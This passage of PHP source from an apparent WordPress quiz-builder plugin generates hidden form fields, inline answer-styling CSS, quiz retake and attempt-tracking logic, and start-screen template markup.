 	$hiddendata .= '<input type="hidden" id="quiz_popup_time_delay" value="'.$quiz_popup_time_delay.'"/>';
 	$hiddendata .= '<input type="hidden" id="quiz_popup_frequency" value="'.$quiz_popup_frequency.'"/>'; 
 	$hiddendata .= '<input type="hidden" id="show_retake" value="'.$show_retake.'"/>'; 
 	$hiddendata .= '<input type="hidden" id="show_firstname_temp" value="'.$show_firstname_temp.'"/>'; 
 	$hiddendata .= '<input type="hidden" id="show_firstname_outcome" value="'.$show_firstname_outcome.'"/>'; 
 	$hiddendata .= '<input type="hidden" id="template_num" value="'.$template_num.'"/>'; 
 	$hiddendata .= '<input type="hidden" id="course_id" value="'.$course_id.'"/>'; 
 	$hiddendata .= '<input type="hidden" id="lesson_id" value="'.$lesson_id.'"/>'; 
 	$hiddendata .= '<input type="hidden" id="already_given_quiz_status" value="'.$already_given_quiz_status.'"/>';  
 	$hiddendata .= '<input type="hidden" id="sqb_retake" value="n"/>'; 
 	$hiddendata .= '<input type="hidden" id="quiz_slider_animation" value="'.$quiz_slider_animation.'">'; 
	$hiddendata .= '<input type="hidden" id="show_start_screen" value="'.$show_start_screen.'">';
	$hiddendata .= '<input type="hidden" id="get_page_id" value="'.$get_page_id.'">'; 
	$hiddendata .= '<input type="hidden" id="third_party_from_enabled" value="'.$third_party_from_enabled.'">'; 
	$hiddendata .= '<input type="hidden" id="optin_name" value="'.$optin_name.'">'; 
	$hiddendata .= '<input type="hidden" id="optin_email" value="'.$optin_email.'">'; 
	$hiddendata .= '<input type="hidden" id="calculator_outcome_id" value="0">'; 

	$hiddendata .= '<input type="hidden" id="game_animation_timer" value="'.((int)$timer_ga*1000).'">';
	$hiddendata .= '<input type="hidden" id="game_animation_audio_option" value="'.$audio_option.'">';
	$hiddendata .= '<input type="hidden" id="game_animation_template" value="'.$template_name.'">';
	$hiddendata .= '<input type="hidden" id="game_animation_outcome_level" value="'.$outcome_message.'">'; 

	if($quiz_display == 'time_based' || $quiz_display == 'percentage_based'){
		$hiddendata .= '<input type="hidden" id="getExitPopupValue" value="'.$getExitPopupValue.'">'; 
	}

	$form_data_custom_script_style = '';
	if($third_party_from_enabled  == 'Y'){
		
		$form_data = SQB_QuizForm::loadArrByQuizId($id);
		if(isset($form_data) && is_array($form_data) && isset($form_data[0])){
			foreach($form_data as $form_data_row){
				
				if(($form_data_row['name'] == 'style') || ($form_data_row['name'] == 'script')){
					$form_data_custom_script_style .= $form_data_row['value'];
					
				}
				
			}
		}
		
	}
	
	if(defined("SAVEQUESTIONANSWERREPORT") && ( SAVEQUESTIONANSWERREPORT == "N")){
		$hiddendata .= '<input type="hidden" id="sqb_save_report" value="n"/>'; 
	}else{
		$hiddendata .= '<input type="hidden" id="sqb_save_report" value="y"/>'; 
	}
	$start_template_css = $form_data_custom_script_style.'<link href="'.plugin_dir_url(__FILE__).'includes/templates/start/template2/template2.css?v='.rand(1,1000).'" rel="stylesheet">';
	$form_quiz_data = sqb_default_messages_for_form_quiz();
	
	if($quiz_type == 'form'){
		$tempdata = $form_quiz_data.$starttempdata.$first_name_tempdata.$quesanstempdata.$optintempdata.$socialsharetempdata.$analyresulttempdata.$formquizdata.$resulttempdata.$funanimationData.$hiddendata.$retakedata_fornon_lesson ;
	}else{
		$tempdata = $starttempdata.$first_name_tempdata.$quesanstempdata.$optintempdata.$socialsharetempdata.$analyresulttempdata.$formquizdata.$resulttempdata.$funanimationData.$hiddendata.$retakedata_fornon_lesson ;
	}
 	
	return stripslashes($tempdata);
}

function getStyleForAnswer($sqbObj){
	 
	$answer_background = sqbGetValidSettingsByKey('answer_background');
	if($answer_background == ""){
		$answer_background = '#4a689a||#ffffff||#e5f1ff||#00bcd4||#ff5757';
	}

	//echo $answer_background ;
	$answer_background = explode('||' , $answer_background);
	
	
	$answer_background_0 = '';
    if(isset($answer_background[0])){
		$answer_background_0 = $answer_background[0];
	}
	
	$answer_background_1 = '';
    if(isset($answer_background[1])){
		$answer_background_1 = $answer_background[1];
	}
	
	$answer_background_3 = '';
    if(isset($answer_background[3])){
		$answer_background_3 = $answer_background[3];
	}
	
	$answer_background_4 = '';
    if(isset($answer_background[4])){
		$answer_background_4 = $answer_background[4];
	}
	
	$answer_background_2 = '';
    if(isset($answer_background[2])){
		$answer_background_2 = $answer_background[2];
	}


	$answer_background_0 = '#f7f7f7';
	$answer_background_1 = 'rgba(79,108,191,1)';
	$answer_background_2 = '#fff';

	$key = "answer_background";
	$answer_bg = sqbGetValidSettingsByKey($key);
	if(!empty($answer_bg)){
		$answer_bg = explode("||", $answer_bg);
		//$answer_background_0 = $answer_bg[2];
		$answer_background_0 = $answer_bg[0];
		$answer_background_1 = $answer_bg[1];
		$answer_background_2 = $answer_bg[2];
	}

	//$quiz_data = SQB_Quiz::loadById($_GET['id']);
	if(isset($sqbObj) && !empty($sqbObj)){
		$answer_background_data = maybe_unserialize($sqbObj->getCustomizerStyleSetting()); 
		
		if(!empty($answer_background_data["answer_background_hover"])){
			$answer_background_0 = $answer_background_data["answer_background_hover"];
		}

		if(!empty($answer_background_data["answer_text_hover"])){
			$answer_background_1 = $answer_background_data["answer_text_hover"];
		}
		if(!empty($answer_background_data["answer_background"])){
			//$answer_background_0 = $answer_background_data["answer_background"];
			$answer_background_2 = $answer_background_data["answer_background"];
		}
	}

	
	
	$settings_data ='
		<style>
		#sqb_quiz_builder .question_add_answer_outer_div .sqb_ans_selected .sqb_ans_item_slider, #sqb_quiz_builder .question_add_answer_outer_div .sqb_ans_item_outer .sqb_ans_item_slider{
			background-color: '.$answer_background_2.'; margin-bottom: 0;
		}
		#sqb_quiz_builder .Quiz-Template .answer_container:not(.question_type_slider_has):not(.image_option_has):not(.no_image_option) .sqb_ans_item_outer.ranking_choices.sqb_ans_selected:not(.text_cls):not(.date_cls):not(.fill_in_blank_cls ):not(.file_upload_cls):not(.slider_cls):not(.numeric_text_cls) .sqb_ans_item.ans_type_ranking_choices .sqb_ans_item_inner *{
			background-color: '.$answer_background_2.'!important;
		}
		.sqb_quiz_container_outer #sqb_quiz_builder .single_fillin_text .sqb_ans_item.ans_type_numeric_text, .sqb_quiz_container_outer #sqb_quiz_builder .single_fillin_text .numeric_text_cls.sqb_ans_selected:hover .sqb_ans_item.ans_type_numeric_text{ background-color: '.$answer_background_2.'!important; }
		#sqb_quiz_builder .Quiz-Template:not(.outer-style8) .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item_outer:not(.text_cls) .sqb_ans_item:not(.matching-answer-outer):not(.ans_type_height_weight):hover,
#sqb_quiz_builder .Quiz-Template:not(.outer-style8).question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item_outer:not(.text_cls) .sqb_ans_item:not(.matching-answer-outer):hover *,
#sqb_quiz_builder .Quiz-Template:not(.outer-style8) .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .addselected *,
#sqb_quiz_builder .Quiz-Template:not(.outer-style8) .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_selected:not(.text_cls) .sqb_ans_item:not(.matching-answer-outer):not(.ans_type_height_weight),
#sqb_quiz_builder .Quiz-Template:not(.outer-style8) .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_selected:not(.text_cls) .sqb_ans_item:not(.matching-answer-outer):not(.ans_type_height_weight) *,
#sqb_quiz_builder .Quiz-Template:not(.outer-style8) .answer_container.grid-layout-active:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item_outer:hover,
#sqb_quiz_builder .Quiz-Template:not(.outer-style8) .question_container.single_fillin_text .sqb_ans_item:not(.matching-answer-outer):not(.ans_type_numeric_text):hover input,
#sqb_quiz_builder .Quiz-Template:not(.outer-style8) .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item_outer.multiple_cls.sqb_ans_selected,
#sqb_quiz_builder .Quiz-Template:not(.outer-style8) .answer_container.grid-layout-active:not(.image_option_has) .sqb_ans_item_outer.single_cls.sqb_ans_selected,
#sqb_quiz_builder .Quiz-Template:not(.outer-style8) .answer_container:not(.image_option_has):not(.grid-layout-active):not(.question_type_slider_has) .sqb_ans_item_outer:not(.text_cls):hover .sqb_ans_item:not(.matching-answer-outer):not(.ans_type_height_weight) {
    background-color: #2fa5da;
    color: #fff;
}

		.question_add_answer_outer_div.grid-layout-active.layout-three-in-row-active:not(.image_option_has) .sqb_ans_item, .question_add_answer_outer_div:not(.image_option_has) .sqb_ans_item{
		/*background-color: '.$answer_background_2.';*/
		background-color: transparent;
		} 
		.question_add_answer_outer_div:not(.image_option_has) .sqb_ans_item_outer.multiple_cls.sqb_ans_selected .sqb_ans_item  *, .question_add_answer_outer_div:not(.image_option_has) .sqb_ans_item_outer.sqb_ans_selected.single_cls .sqb_ans_item *{color:'.$answer_background_1.' !important;}
		.single_fillin_text .sqb_ans_item_outer.multiple_cls.sqb_ans_selected .sqb_ans_item  *, .single_fillin_text  .sqb_ans_item_outer.sqb_ans_selected.single_cls .sqb_ans_item *{color:#333 !important;}
		.answer_container.grid-layout-active:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item_outer, .answer_container:not(.image_option_has):not(.grid-layout-active):not(.question_type_slider_has) .sqb_ans_item_outer .sqb_ans_item {   
		background-color: '.$answer_background_2.'; 
		}
		
		.ans_in_resultpage.incorrect_ans_div, .ans_in_resultpage.correct_ans_div {background:  '.$answer_background_4.' !important; }
		.ans_in_resultpage.correct_ans_div {background:  '.$answer_background_3.' !important; }
		.ans_in_resultpage.correct_ans_div.freetext_div {background: #555 !important; }
		 
		
				
				.answer_container.question_add_answer_outer_div.image_option_has.one-in-a-row  .sqb_ans_item {
					background-color: '.$answer_background_2.'; 
				}
				.answer_container.question_add_answer_outer_div.image_option_has.one-in-a-row  .sqb_ans_item:hover , .answer_container.question_add_answer_outer_div.image_option_has.one-in-a-row  .sqb_ans_item:hover * ,				
				.answer_container.question_add_answer_outer_div.image_option_has.one-in-a-row .single_cls.sqb_ans_selected .sqb_ans_item,
				.answer_container.question_add_answer_outer_div.image_option_has.one-in-a-row .single_cls.sqb_ans_selected .sqb_ans_item
				{
					background-color: '.$answer_background_0.' !important;
					color: '.$answer_background_1.' !important;
				}
.quiz-slide-animation .Quiz-Template:not(.outer-style7) .Quiz-Template-overflow  .answer_container .sqb_ans_item_outer:not(.matrix_cls):not(.slider_cls):not(.weight_and_height_cls):hover ,
.quiz-slide-animation .Quiz-Template:not(.outer-style7) .Quiz-Template-overflow  .answer_container .sqb_ans_item_outer.sqb_ans_selected:not(.matrix_cls):not(.slider_cls) {-webkit-box-shadow: inset 0 0 0 2px  '.$answer_background_0.', 2px 4px 7px rgb(0 0 0 / 15%);box-shadow: inset 0 0 0 2px  '.$answer_background_0.', 2px 4px 7px rgb(0 0 0 / 15%);}
.quiz-slide-animation .Quiz-Template-overflow  .answer_container .sqb_ans_item_outer.sqb_ans_selected:not(.matrix_cls):not(.slider_cls):after {border-color:'.$answer_background_0.';}
	 .sqb_quiz_container_outer #sqb_quiz_builder .single_fillin_text .sqb_ans_item , .sqb_quiz_container_outer #sqb_quiz_builder .single_fillin_text .sqb_ans_item_outer:not(.nemeric_text_cls):hover .sqb_ans_item ,  .single_fillin_text .answer_container:not(.image_option_has):not(.question_type_slider_has):not(.grid-layout-active) .sqb_ans_item_outer:hover .sqb_ans_item {
    background-color: transparent !important;
}
.question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item:not(.ans_type_numeric_text):hover, .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item:not(.ans_type_numeric_text):hover *, .question_add_answer_outer_div:not(.question_type_slider_has) .addselected *, .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_selected:not(.file_upload_cls):not(.numeric_text_cls) .sqb_ans_item, .question_add_answer_outer_div:not(.question_type_slider_has) .sqb_ans_selected:not(.file_upload_cls):not(.numeric_text_cls) .sqb_ans_item *, .answer_container.grid-layout-active:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item_outer:hover, #sqb_quiz_builder .question_container.single_fillin_text .sqb_ans_item:not(.ans_type_numeric_text):hover input, #sqb_quiz_builder .question_container.single_fillin_text .sqb_ans_item:hover textarea, .question_add_answer_outer_div:not(.question_type_slider_has) .sqb_ans_item_outer.multiple_cls.sqb_ans_selected, .answer_container.grid-layout-active .sqb_ans_item_outer.single_cls.sqb_ans_selected:(.image_option_has), .answer_container:not(.image_option_has):not(.question_type_slider_has):not(.grid-layout-active) .sqb_ans_item_outer:hover .sqb_ans_item, .multiple_correct_checkbox.checkbox_sel .sqb_ans_item .sqb_ans_item_inner , .multiple_correct_checkbox.checkbox_sel .sqb_ans_item .sqb_ans_item_inner *{
		background-color: '.$answer_background_0.' !important;
		color: '.$answer_background_1.' !important;
		}
		.quiz-slide-animation .Quiz-Template-overflow .answer_container:not(.image_option_has) .multiple_correct_checkbox.sqb_ans_item_outer.multiple_cls.sqb_withoutradio.sqb_ans_selected:not(.fill_in_blank_cls ):not(.text_cls):not(.date_cls):not(.file_upload_cls):not(.slider_cls):not(.numeric_text_cls), .quiz-slide-animation .Quiz-Template-overflow .answer_container:not(.image_option_has) .multiple_correct_checkbox.sqb_ans_item_outer.multiple_cls.sqb_withoutradio.sqb_ans_selected:not(.fill_in_blank_cls ):not(.text_cls):not(.date_cls):not(.file_upload_cls):not(.slider_cls):not(.numeric_text_cls) .sqb_ans_item *, #sqb_quiz_builder .Quiz-Template-overflow .answer_container:not(.question_type_slider_has):not(.image_option_has):not(.no_image_option) .sqb_ans_selected:not(.text_cls):not(.date_cls):not(.fill_in_blank_cls ):not(.file_upload_cls):not(.ranking_choices):not(.slider_cls):not(.numeric_text_cls):not(.email_cls):not(.phone_number_text_cls) .sqb_ans_item:not(.matching-answer-outer):not(.ans_type_height_weight) *{
    background-color: '.$answer_background_0.' !important;  color: '.$answer_background_1.' !important;
}

.question_add_answer_outer_div:not(.question_type_slider_has):not(.question_type_slider_has):not(.image_option_has):not(.no_image_option) .sqb_ans_item:not(.sqb-time-option):not(.matching-answer-outer):not(.ans_type_height_weight):hover, .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has):not(.no_image_option) .sqb_ans_item:not(.sqb-time-option):not(.matching-answer-outer):not(.ans_type_height_weight):hover *, .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has):not(.no_image_option) .addselected *, .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has):not(.no_image_option) .sqb_ans_selected .sqb_ans_item:not(.matching-answer-outer):not(.ans_type_height_weight), .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has):not(.no_image_option) .sqb_ans_selected .sqb_ans_item:not(.matching-answer-outer):not(.ans_type_height_weight) *, .answer_container.grid-layout-active:not(.question_type_slider_has):not(.image_option_has):not(.no_image_option) .sqb_ans_item_outer:hover, #sqb_quiz_builder .question_container.single_fillin_text .sqb_ans_item:not(.ans_type_numeric_text):not(.sqb-time-option):not(.matching-answer-outer):hover input, #sqb_quiz_builder .question_container.single_fillin_text .sqb_ans_item:not(.matching-answer-outer):hover textarea, .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item_outer.multiple_cls.sqb_ans_selected, .answer_container.grid-layout-active:not(.image_option_has) .sqb_ans_item_outer.single_cls.sqb_ans_selected, .answer_container:not(.image_option_has):not(.grid-layout-active):not(.question_type_slider_has) .sqb_ans_item_outer:hover .sqb_ans_item:not(.matching-answer-outer):not(.sqb-time-option):not(.ans_type_height_weight){
background-color: '.$answer_background_0.' !important;  color: '.$answer_background_1.' !important;
}


#sqb_quiz_builder .Quiz-Template .answer_container .sqb_ans_item_outer.ranking_choices .sqb_ans_item.ans_type_ranking_choices,
#sqb_quiz_builder .Quiz-Template .answer_container .sqb_ans_item_outer.ranking_choices .sqb_ans_item.ans_type_ranking_choices .sqb_ans_item_inner,
#sqb_quiz_builder .Quiz-Template .answer_container .sqb_ans_item_outer.ranking_choices .sqb_ans_item.ans_type_ranking_choices *,
#sqb_quiz_builder .Quiz-Template .answer_container .sqb_ans_item_outer.ranking_choices .sqb_ans_item.ans_type_ranking_choices .sql_ans_text,
#sqb_quiz_builder .Quiz-Template .answer_container .sqb_ans_item_outer.ranking_choices .sqb_ans_item.ans_type_ranking_choices .sql_ans_text * {background: #e5f1ff !important;color: #333 !important;}
body .sqb_quiz_container_outer #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .single_fillin_text .answer_container textarea, body .sqb_quiz_container_outer #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .single_fillin_text .answer_container .date-question-type, body .sqb_quiz_container_outer #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .single_fillin_text .sqb_fill_in_blank_ans_field {
    color: #333 !important;background: #fff !important;
}
 .quiz-slide-animation #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .answer_container .single_cls.sqb_ans_selected .sqb_ans_item_inner, .quiz-slide-animation #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .answer_container .single_cls.sqb_ans_selected .sqb_ans_item_inner * {
    color: #333 !important;
}

 #sqb_quiz_builder .Quiz-Template-overflow .answer_container:not(.question_type_slider_has) .sqb_ans_selected .sqb_ans_item * {
    background-color: inherit !important;    
}
.quiz-slide-animation #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .answer_container .single_cls.sqb_ans_selected .sqb_ans_item_inner, .quiz-slide-animation #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .answer_container .single_cls.sqb_ans_selected .sqb_ans_item_inner * {
    background-color: inherit !important;
}
.quiz-slide-animation .Quiz-Template-overflow .answer_container .multiple_correct_checkbox.multiple_cls.sqb_ans_item_outer.sqb_ans_selected:not(.matrix_cls):after , .quiz-slide-animation .Quiz-Template-overflow .answer_container .single_cls.sqb_ans_item_outer.sqb_ans_selected:not(.matrix_cls):after {
   display:none;
}
.sqb_quiz_container_outer #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .answer_container .sqb_ans_selected .ans_type_rating.sqb_ans_item * {
    background: #fff !important;
}
#sqb_quiz_builder .Quiz-Template .answer_container .sqb_ans_item_outer.sqb_ans_selected .sqb_ans_item.ans_type_rating, #sqb_quiz_builder .Quiz-Template.Quiz-Template-5 .answer_container .sqb_ans_item_outer.sqb_ans_selected .sqb_ans_item.ans_type_rating {
    padding-left: 0;
}body .sqb_quiz_container_outer #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .single_fillin_text .answer_container textarea, body .sqb_quiz_container_outer #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .single_fillin_text .sqb_fill_in_blank_ans_field,
body .sqb_quiz_container_outer #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .single_fillin_text .answer_container textarea:hover, body .sqb_quiz_container_outer #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .single_fillin_text .sqb_fill_in_blank_ans_field:hover{    background: #fff !important; }
 </style> 
		';
		return $settings_data;
}
 


//get retake  data
function sqb_check_for_retake_data($id, $quiz_attempts_allowed, $total_attempts, $user_id, $allow_retake,$count_manage_lead_data, $course_id, $lesson_id){
	 //check if user loggedin in wp
	$retake_data = "notallowed";
	$display_retake ="display:none";
	$show_firstname_temp ="N";
	$starttempdata ="";	
	
	if($allow_retake =="Y"){
		if($quiz_attempts_allowed =="limited"){			
			//check user id if exist
			if( $user_id !='' ){
				$leads_total_attempts = sqb_get_attempts($id, $user_id, $course_id, $lesson_id);			 								
				if($leads_total_attempts <= $total_attempts){	
					$retake_data = "retake_data";
					if($count_manage_lead_data >0){
						$retake_data = "retake_data";
					}else{
						$retake_data = "cannottakequiz";
					}						 						
					
				}else{							 
					$retake_data = "cannottakequiz";
				}				 
			}
		}else{
			$retake_data = "retake_data";			
		}		
	}
	return $retake_data;
}

//get retake  html
function sqb_check_for_retake_html($id, $quiz_attempts_allowed, $total_attempts, $user_id, $allow_retake, $retake_data, $count_manage_lead_data, $course_id, $lesson_id, $show_start_screen='', $quiz_display = ''){
	$displayretake ="n";
	if($retake_data =="retake_data"	){			
		$display_retake ="display:block";
		$displayretake ="y";		
	}elseif($retake_data =="notallowed"	){
		$display_retake ="display:none";
	}elseif($retake_data =="cannottakequiz"	){
		$display_retake ="display:none";
	}else{
		$starttempdata = getStartTemplateData($id, $lesson_id, $show_start_screen, $user_id, $course_id,$quiz_display);	
	}
	
	
	$leads_total_attempts = sqb_get_attempts($id,  $user_id, $course_id, $lesson_id);	
	$retakedata = '<div class="reake_data_outer" style="'.$display_retake.'">'.sqb_get_retake_data().'</div><input  type="hidden" name="displayretake" id="displayretake" value="'.$displayretake.'"/>';	
	$attempts_data = '<input type="hidden" id="leads_total_attempts" value="'.$leads_total_attempts.'"/><input type="hidden" id="quiz_attempts_allowed" value="'.$quiz_attempts_allowed.'"/><input type="hidden" id="total_attempts" value="'.$total_attempts.'"/><input type="hidden" id="allow_retake" value="'.$allow_retake.'"/><input type="hidden" id="dap_id" value="'.$user_id.'"/><input type="hidden" id="count_manage_lead_data" value="'.$count_manage_lead_data.'"/>';			
	$final_retake_data =  $retakedata.$attempts_data;
	
	return $final_retake_data;
}


//get attempts data
function sqb_get_attempts($quiz_id, $user_id, $course_id, $lesson_id){
	// get wp current user // logged-in user
	$leads_total_attempts= 0;	 	 
	if($user_id !=""){		 							
		$leadsObj = SQB_ManageLeads::loadByQuizIdAndUserIdAndCourseIdAndLessonId($quiz_id, $user_id, $course_id, $lesson_id);	
		 
		if( isset($leadsObj)){
			if( isset($leadsObj[0])){
				$leads_total_attempts = $leadsObj[0]->getTotalAttempts();
			}
		}
	}
	return  $leads_total_attempts;
	
}
//get sqb_user_outcome
function sqb_user_outcome($quiz_id, $user_id, $course_id, $lesson_id){
	$outcome= 0;
	if($user_id !=""){		 							
		$leadsObj = SQB_ManageLeads::loadByQuizIdAndUserIdAndCourseIdAndLessonId($quiz_id, $user_id, $course_id, $lesson_id); 
		if( isset($leadsObj)){
			if( isset($leadsObj[0])){			 
				$outcome = $leadsObj[0]->getOutcome();
			}
		}
	}
	return $outcome;
}	
	//get sqb_user_question_answerdata
function sqb_user_point_details($quiz_id, $user_id, $course_id, $lesson_id){
	 
	$point_picked= "0||0";
	if($user_id !=""){		 							
		$leadsObj =  SQB_ManageLeads::loadByQuizIdAndUserIdAndCourseIdAndLessonId($quiz_id, $user_id, $course_id, $lesson_id);
		 
		if( isset($leadsObj)){
			if( isset($leadsObj[0])){			 
				$date = $leadsObj[0]->getDate();
				$sqbloadquestionsobj = SQB_UserQuizDetails::loadByUserIdAndQuizIdDate($user_id, $quiz_id,$date);
 				if(isset($sqbloadquestionsobj)){ 
					foreach($sqbloadquestionsobj as $questions) {
						$total_points  = $questions->getTotalPoints();
						$points_scored = $questions->getPointsScored();
						$point_picked= $points_scored.'||'.$total_points;
					} 
				}
			}
		}
	}
	return  $point_picked;
	
}
	//get sqb_user_question_answerdata
function sqb_user_question_answerdata($quiz_id, $user_id,  $question_id, $answer_id, $course_id, $lesson_id){
	 
	$picked_answer_id= false;
	if($user_id !=""){		 							
		$leadsObj = SQB_ManageLeads::loadByQuizIdAndUserIdAndCourseIdAndLessonId($quiz_id, $user_id, $course_id, $lesson_id);
		 
		if( isset($leadsObj)){
			if( isset($leadsObj[0])){
				 			 
				$date = $leadsObj[0]->getDate();
				$sqbloadquestionsobj = SQB_UserQuizDetails::loadByUserIdAndQuizIdDate($user_id, $quiz_id,$date);
				 
 				if(isset($sqbloadquestionsobj)){ 
					 foreach($sqbloadquestionsobj as $questions) {
						$question_id1 = $questions->getQuestionId();
						$answer_given = $questions->getAnswerGiven();
						 		
						 if($question_id == $question_id1){
							$answer_given_array = explode(',',$answer_given);	
							if (in_array($answer_id, $answer_given_array)){
								$picked_answer_id= true;
								//return  $picked_answer_id;
							}	
						}
					} 
				}
			}
		}
	}
	return  $picked_answer_id;
	
}
	//get sqb_user_question_answer_text
function sqb_user_question_answer_text($quiz_id, $user_id,  $question_id, $answer_id, $course_id, $lesson_id){
	 
	$picked_answer_text= '';
	if($user_id !=""){		 							
		$leadsObj = SQB_ManageLeads::loadByQuizIdAndUserIdAndCourseIdAndLessonId($quiz_id, $user_id, $course_id, $lesson_id);
		 
		if( isset($leadsObj)){
			if( isset($leadsObj[0])){
				 			 
				$date = $leadsObj[0]->getDate();
				$sqbloadquestionsobj = SQB_UserQuizDetails::loadByUserIdAndQuizIdDate($user_id, $quiz_id,$date);
				 
 				if(isset($sqbloadquestionsobj)){ 
					 foreach($sqbloadquestionsobj as $questions) {
						$question_id1 = $questions->getQuestionId();
						$answer_given = $questions->getAnswerGiven();
						$answer_text = $questions->getAnswerText();
						 		
						 if($question_id == $question_id1){
							$picked_answer_text= $answer_text;
						}
					} 
				}
			}
		}
	}
	return  $picked_answer_text;
	
}


//get retake data
function sqb_get_retake_data(){
 
	$retake_data = sqbGetValidSettingsByKey('retake_button_html');
	if($retake_data == "" || $retake_data == "undefined"){
		$retake_data ='<div class="retake_button sqb_tiny_mce_editor" ><div>Retake</div></div>';
	}
	
	return $retake_data;
}

//get start template Data 
function getStartTemplateData($id, $lesson_id='', $show_start_screen='', $dap_id=0, $course_id=0, $quiz_display=''){
	    $sqbObj =  SQB_Quiz::loadById($id);   
	    $classforvh = ""; 
		if(isset($sqbObj)){
			//$quiz_display = $sqbObj->getQuizDisplay();
			$quiz_popup_position = $sqbObj->getQuizPopupPosition();
		}
		
		$modal_pop_corner_position = '';
		if($quiz_popup_position == 'Left' && $quiz_display == 'corner_popup'){
		$modal_pop_corner_position = 'modal_pop_corner_left';
		}
	
	$sqbtemplateobj =  SQB_QuizTemplate::loadByQuizId($id); 	 
	$start_temp= "";
	$imgbg_postion ='center top';
	if(isset($sqbtemplateobj)){		 

		$template =  $sqbObj->getTemplate();
								
		$default_image = '';
		$image_background = '';
		$classforvh = '';
		$sqb_start_screen_background_image = '';
		$template_width = 'max-width:400px!important;width:100%;';
		if($template == "template6"){

			if($sqbObj->getTransparentBackgroundSettings() != ''){

				$get_settings = $sqbObj->getTransparentBackgroundSettings();

				$get_details = explode("|",$get_settings);

				$width_sign = $get_details[0];
				$background_width = $get_details[1];
				$height_sign = $get_details[2];
				$background_height = $get_details[3];
				$settings_image = $get_details[4];
				$min_height = $get_details[5];				
				$imgbg_postion = $get_details[8];
				$background_color = '';
				$height_main = '';
				$template6_background_padding = '';
				if(!empty($get_details[9])){
				$background_color = $get_details[9];
				}
				if(!empty($get_details[11])){
								$height_main = $get_details[11];
							}
				if(!empty($get_details[12])){
					$template6_background_padding = $get_details[12];
				}
				if($settings_image == '' || $settings_image == 'none' || $settings_image == 'undefined'){
					//$default_image .= 'background-image:url('.plugin_dir_url(__FILE__).'includes/images/template6.jpeg);';
					//$get_img_url = plugin_dir_url(__FILE__).'includes/images/template6.jpeg)';
					$get_img_url = '';
				}else{
					//$default_image .= 'background-image:url('.$settings_image.');';
					$get_img_url = $settings_image;
				}
				if($width_sign == 'px'){
					$template_width = 'max-width:'.$background_width.'px!important;width:100%;';
					$default_image .= 'width:'.$background_width.'px;';
					$default_image .= 'background-repeat:no-repeat;';
					$default_image .= 'background-position:'.$imgbg_postion.';';
					$default_image .= 'background-size: cover;';
					$default_image .= 'max-width: 100%;';
					$default_image .= 'position:relative;';
					//$default_image .= 'min-height:'.$height_main.';';
				} else if($width_sign = '%'){
					$template_width ='max-width:'.$background_width.'%!important;width:100%;';
					$default_image .= 'width:'.$background_width.'%;';
					$default_image .= 'background-repeat:no-repeat;';
					$default_image .= 'background-position:'.$imgbg_postion.';';
					$default_image .= 'background-size: cover;';
					$default_image .= 'max-width: 100%;';
					$default_image .= 'position:relative;';
					//$default_image .= 'min-height:'.@$height_main.';';
				}

				if($height_sign == 'px'){
					$default_image .= 'padding:'.$background_height.'px 0;';
				} else if($height_sign = 'vh'){
					$default_image .= 'min-height:'.$background_height.'vh;';
					//$default_image .= 'min-height:'.$min_height.';';
					if($show_start_screen =="Y"){
					$default_image .= '';
					} else {
					$default_image .= 'display: none;';
					}
					
					$classforvh = "height-in-vh";
					$default_image .= 'justify-content: center;';
					$default_image .= 'align-items: center;';
					$default_image .= 'position:relative;';
					//$default_image .= 'min-height:'.$height_main.';';
				}
				$default_image .= 'background-color: '.@$background_color.';';
				if(!empty($get_details[12])){
					$default_image .= 'padding-top: '.@$template6_background_padding.'px;';
					$default_image .= 'padding-bottom: '.@$template6_background_padding.'px;';
				}
			}else{
				//$default_image = 'background-image:url('.plugin_dir_url(__FILE__).'includes/images/template6.jpeg);';
				$get_img_url = plugin_dir_url(__FILE__).'includes/images/template6.jpeg';
				$default_image .= 'background-repeat:no-repeat;';
				$default_image .= 'background-position:'.$imgbg_postion.';';
				$default_image .= 'background-size: cover;';
				$default_image .= 'position:relative;';
				$default_image .= 'min-height:'.$height_main.';';
			} 
			if($get_img_url == ''){
				$image_background = '';
			} else {
				$image_background = '<div class="background-image-template6"><img src="'.$get_img_url.'"></div>';
			}
			
		}else if($template == "template8"){
			
			$customizer_style_settings = maybe_unserialize($sqbObj->getCustomizerStyleSetting());
			if(!empty($customizer_style_settings["template8_background_image"])){
				$sqb_start_screen_background_image = 'sqb_start_screen_background_image';
			}
		}


		$quiz_start_template = urldecode($sqbtemplateobj->getQuizStartTemplateHtml());
		
		$quiz_start_template =  str_replace('contenteditable="true"','contenteditable="false"',$quiz_start_template); 
		$displaydata= "display:none";
		 
		if($lesson_id !=""){
